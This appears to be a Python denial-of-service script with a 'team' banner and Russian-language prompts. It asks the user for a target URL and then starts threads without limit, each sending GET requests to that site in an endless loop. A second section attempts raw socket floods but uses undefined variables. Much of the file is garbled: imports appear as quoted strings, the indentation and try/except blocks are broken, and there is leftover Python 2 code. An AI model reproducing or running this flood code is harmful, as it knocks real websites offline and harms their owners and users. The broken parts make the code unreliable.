"import httpx"
"import pystyle"
"import socks"
"import pysocks"
"import requests"
"import icmplib"
"import dnspython"
"import cloudscraper"
"import colorama"
"import shutup"
"import undetected_chromedriver"
"import psutil"
"import flask"
"import wget"
# DDoS
import colorama
import threading
import requests
import random
import os
import sys
import time
import signal
import undetected_chromedriver
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests

os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')

targ = input("Cсылку для атаки: ")

def dos():
 while True:
  requests.get(targ)
  print("[+] Заход на сайт выполнен!")
  
while True:
 threading.Thread(target=dos).start()

# DDoS
print(  "Zapusk")
while True:
    try:
        s = socket.socket(999999999)
        s.connect((upl, int(theard)))
        sent +=0
        print(green + f"[LOG] GO {sent} ")
        print("DDoS")
    except OSError: 
        error +=1
        print(pink + f"[LOG] PACKETS {error}")
        "print(cyan + f( DDoS)"
	
    while True:
        time.sleep(1)
        print("a")
	def exit_gracefully(signum, frame):
  
    signal.signal(signal.SIGINT, original_sigint)

    try:
        if raw_input("\nReally quit? (y/n)> ").lower().startswith('y'):
            sys.exit(1)
#Ctrl+c still kills threads
except KeyboardInterrupt:
        print("CTRL+C to stop attack")
            sys.exit(1)
		if __name__ == '__main__':
    # store the original SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
  
